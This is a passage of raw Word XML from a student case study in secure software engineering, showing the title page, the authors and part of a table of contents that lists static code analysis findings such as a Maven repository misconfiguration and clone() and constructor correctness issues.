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2A6659" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="5340"/>
        </w:tabs>
        <w:spacing w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_an2xbqmwuw2b" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A37501D" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:before="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:smallCaps/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="050A0BCF" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>B&amp;B</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAB6C7B" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02EB378F" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0727AF69" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CASE STUDY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A05A809" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A39BBE3" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CEBC5A9" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="right" w:pos="9026"/>
        </w:tabs>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:smallCaps/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:smallCaps/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SECURE SOFTWARE ENGINEERING</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55872B52" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="right" w:pos="9026"/>
        </w:tabs>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:smallCaps/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:smallCaps/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>a.a</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:smallCaps/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>. 2024-2025</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C8F396" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72A3D3EC" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D0B940D" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E27B00A" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60061E4C" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79EC0FDB" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>TEAM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7F71EC" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Balzano Nicola n.balzano2@studenti.uniba.it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CEAEB7" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Boffolo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Alessandro Aldo a.boffolo@studenti.uniba.it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EAFD9C" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CCB0AB" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_22ybskdlqw6i" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="1"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Indice</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="2" w:name="_3yh0jfmetklm" w:colFirst="0" w:colLast="0" w:displacedByCustomXml="next"/>
    <w:bookmarkEnd w:id="2" w:displacedByCustomXml="next"/>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:eastAsia="Lucida Sans" w:hAnsi="Lucida Sans" w:cs="Lucida Sans"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it" w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:id w:val="1925383235"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="420EA8C3" w14:textId="47B3020A" w:rsidR="002039E1" w:rsidRDefault="002039E1">
          <w:pPr>
            <w:pStyle w:val="Titolosommario"/>
          </w:pPr>
          <w:r>
            <w:t>Sommario</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="1DF909DF" w14:textId="39F0F2AE" w:rsidR="002039E1" w:rsidRDefault="002039E1">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="480"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r>
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc200039243" w:history="1">
            <w:r w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>VULNERABILITIES ANALYSIS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039243 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="75FC777E" w14:textId="2F40B37D" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="960"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039244" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Static Code Analysis</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039244 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7181018D" w14:textId="06B3938D" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039245" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.1.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Build Misconfiguration: External Maven Dependency Repository</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039245 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7D2563E6" w14:textId="76D4F07B" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039246" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.2.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Code Correctness: Class Does Not Implement Equivalence Method</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039246 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1E765B21" w14:textId="10317C73" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039247" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.3.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Code Correctness: clone() Invokes Overridable Function</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039247 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3D92BC1B" w14:textId="2005AA9C" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039248" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.4.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Code Correctness: Constructor Invokes Overridable Function</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039248 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="41473DB6" w14:textId="1397571C" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039249" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.5.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Code Correctness: Non-Static Inner Class Implements Serializable</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039249 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
